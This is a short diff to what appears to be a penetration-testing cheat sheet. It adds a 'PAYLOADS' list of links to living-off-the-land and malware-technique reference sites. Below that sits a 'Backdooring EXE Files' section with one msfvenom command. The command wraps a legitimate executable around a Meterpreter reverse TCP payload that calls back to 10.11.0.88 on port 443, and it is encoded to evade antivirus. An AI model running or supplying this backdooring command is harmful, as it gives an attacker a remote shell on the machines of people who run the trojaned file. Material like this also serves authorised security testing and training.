@@ -1,3 +1,17 @@
+PAYLOADS
+
+http://lolbas-project.github.io
+http://loldrivers.io
+http://gtfobins.github.io
+http://lots-project.com
+http://filesec.io
+http://malapi.io
+http://hijacklibs.net
+http://wadcoms.github.io
+http://persistence-info.github.io
+http://unprotect.it
+
+
 # Backdooring EXE Files
 
 	msfvenom -a x86 -x <[FILE]> -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.88 lport=443 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o <[FILE_NAME]>
